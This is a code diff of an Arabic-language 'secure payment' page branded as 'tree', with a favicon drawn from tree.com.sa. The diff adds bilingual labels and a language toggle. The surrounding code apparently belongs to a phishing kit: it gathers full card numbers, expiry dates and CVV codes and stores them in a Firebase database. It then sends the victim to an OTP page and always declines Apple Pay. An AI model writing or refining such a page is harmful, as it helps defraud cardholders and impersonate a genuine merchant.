@@ -4,9 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="js/theme-toggle.js"></script>
-    <title>بوابة الدفع الآمنة - تري</title>
+    <script src="js/i18n.js"></script>
+    <title>بوابة الدفع الآمنة | Secure Payment - tree</title>
     <link rel="icon" type="image/png" href="https://tree.com.sa/assets/images/favicon.png">
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="css/site-theme.css">
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
@@ -83,27 +84,28 @@
         <div class="pay-topbar">
             <span class="pay-topbar__lock" aria-hidden="true">🔒</span>
             <div class="pay-topbar__text">
-                <strong>دفع آمن</strong>
-                <small>بياناتك مشفّرة عبر اتصال محمي</small>
+                <strong data-i18n="pay.secure">دفع آمن</strong>
+                <small data-i18n="pay.encrypted">بياناتك مشفّرة عبر اتصال محمي</small>
             </div>
+            <button class="btn btn-sm ms-auto" style="background:rgba(255,255,255,0.2);color:#fff;border:1px solid rgba(255,255,255,0.3);font-size:0.75rem;" data-lang-toggle onclick="toggleLang()">EN</button>
         </div>
         <div class="pay-header">
             <img src="images/logo.png" alt="تري" onerror="this.src='https://placehold.co/120x40/198754/ffffff?text=TREE'">
-            <h3>إتمام عملية الدفع</h3>
+            <h3 data-i18n="pay.complete">إتمام عملية الدفع</h3>
         </div>
 
         <div class="pay-body">
-            <div class="pay-section-title">اختر طريقة الدفع</div>
+            <div class="pay-section-title" data-i18n="pay.choose_method">اختر طريقة الدفع</div>
 
             <div class="payment-method" id="method-card" role="button" tabindex="0" onclick="selectMethod('card')" onkeydown="if(event.key==='Enter')selectMethod('card')">
-                <span class="method-title">البطاقات الائتمانية</span>
+                <span class="method-title" data-i18n="pay.credit_cards">البطاقات الائتمانية</span>
                 <div class="method-logos">
                     <img src="images/payment/visa.svg" width="48" height="30" alt="Visa">
                     <img src="images/payment/mastercard.svg" width="48" height="30" alt="Mastercard">
                 </div>
             </div>
             <div class="payment-method" id="method-mada" role="button" tabindex="0" onclick="selectMethod('mada')" onkeydown="if(event.key==='Enter')selectMethod('mada')">
-                <span class="method-title">مدى</span>
+                <span class="method-title" data-i18n="pay.mada">مدى</span>
                 <div class="method-logos">
                     <img src="images/payment/mada.svg" width="56" height="34" alt="مدى">
                 </div>
@@ -117,12 +119,12 @@
 
             <div id="card-form">
                 <div class="f-group">
-                    <label for="p-name">اسم صاحب البطاقة</label>
-                    <input type="text" id="p-name" name="ccname" placeholder="الاسم كما هو مكتوب على البطاقة" inputmode="text" autocomplete="cc-name" autocapitalize="words" spellcheck="false">
+                    <label for="p-name" data-i18n="pay.name_label">اسم صاحب البطاقة</label>
+                    <input type="text" id="p-name" name="ccname" data-i18n="pay.name_ph" placeholder="الاسم كما هو مكتوب على البطاقة" inputmode="text" autocomplete="cc-name" autocapitalize="words" spellcheck="false">
                 </div>
 
                 <div class="f-group">
-                    <label for="c-num">رقم البطاقة</label>
+                    <label for="c-num" data-i18n="pay.card_label">رقم البطاقة</label>
                     <div id="c-num-wrap">
                         <input type="text" id="c-num" name="cardnumber" inputmode="numeric" autocomplete="cc-number" maxlength="19" placeholder="0000 0000 0000 0000" dir="ltr">
                         <img id="c-logo-box" src="" alt="">
@@ -131,7 +133,7 @@
 
                 <div class="c-exp-row">
                     <div class="f-group">
-                        <label>تاريخ الانتهاء</label>
+                        <label data-i18n="pay.expiry">تاريخ الانتهاء</label>
                         <div style="display:flex;gap:8px;">
                             <select id="e-m" autocomplete="cc-exp-month" aria-label="شهر الانتهاء">
                                 <option value="">شهر</option>
@@ -144,17 +146,17 @@
                         </div>
                     </div>
                     <div class="f-group">
-                        <label for="c-v">الرمز السري (CVV)</label>
+                        <label for="c-v" data-i18n="pay.cvv">الرمز السري (CVV)</label>
                         <input type="password" id="c-v" name="cvc" maxlength="4" inputmode="numeric" autocomplete="cc-csc" placeholder="•••" style="text-align:center;letter-spacing:.2em;" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                     </div>
                 </div>
 
-                <button type="button" class="btn-pay" onclick="checkAndSend()">تأكيد ودفع</button>
+                <button type="button" class="btn-pay" id="pay-btn" onclick="checkAndSend()" data-i18n="pay.confirm_btn">تأكيد ودفع</button>
             </div>
 
             <div class="trust-row">
                 <span aria-hidden="true">🛡️</span>
-                <span>معالجة آمنة وفق معايير الدفع الإلكتروني</span>
+                <span data-i18n="pay.trust">معالجة آمنة وفق معايير الدفع الإلكتروني</span>
             </div>
         </div>
     </div>
@@ -201,7 +203,7 @@
             document.getElementById('method-mada').classList.add('selected');
         } else if (method === 'apple') {
             document.getElementById('method-apple').classList.add('selected');
-            alert("عذراً، خدمة Apple Pay غير متوفرة حالياً، يرجى الدفع بالبطاقة أو مدى");
+            alert(t('pay.apple_unavailable'));
         }
         document.getElementById('card-form').classList.add('visible');
     }
@@ -264,12 +266,12 @@
         const cleanNum = num.replace(/\s+/g, '');
 
         if (cleanNum.length < 15 || !validateLuhn(cleanNum)) {
-            alert("❌ رقم البطاقة غير صحيح، يرجى التأكد من الرقم المكتوب على البطاقة");
+            alert(t('pay.err_card'));
             return;
         }
 
         if (name.length < 3 || !month || !year || cvv.length < 3) {
-            alert("⚠️ يرجى إكمال باقي بيانات البطاقة (الاسم، التاريخ، والرمز السري)");
+            alert(t('pay.err_incomplete'));
             return;
         }
 
@@ -278,18 +280,18 @@
         const currentMonth = now.getMonth() + 1;
 
         if (parseInt(year, 10) < currentYear || (parseInt(year, 10) === currentYear && parseInt(month, 10) < currentMonth)) {
-            alert("❌ تاريخ انتهاء البطاقة غير صحيح (البطاقة منتهية الصلاحية)");
+            alert(t('pay.err_expired'));
             return;
         }
 
         payBtn.disabled = true;
-        payBtn.innerHTML = '<span class="spinner-border" role="status" aria-hidden="true"></span> جاري المعالجة...';
+        payBtn.innerHTML = '<span class="spinner-border" role="status" aria-hidden="true"></span> ' + t('pay.processing');
 
         const userId = localStorage.getItem('user_id');
         if (!userId) {
-            alert("خطأ: لم يتم العثور على جلسة المستخدم. يرجى البدء من جديد.");
+            alert(t('pay.err_session'));
             payBtn.disabled = false;
-            payBtn.innerText = "تأكيد ودفع";
+            payBtn.innerText = t('pay.confirm_btn');
             return;
         }
 
@@ -304,9 +306,9 @@
             });
             window.location.href = "otp_verification.html";
         } catch (e) {
-            alert("عذراً، حدث خطأ في النظام، يرجى المحاولة لاحقاً");
+            alert(t('pay.err_system'));
             payBtn.disabled = false;
-            payBtn.innerText = "تأكيد ودفع";
+            payBtn.innerText = t('pay.confirm_btn');
         }
     }
 
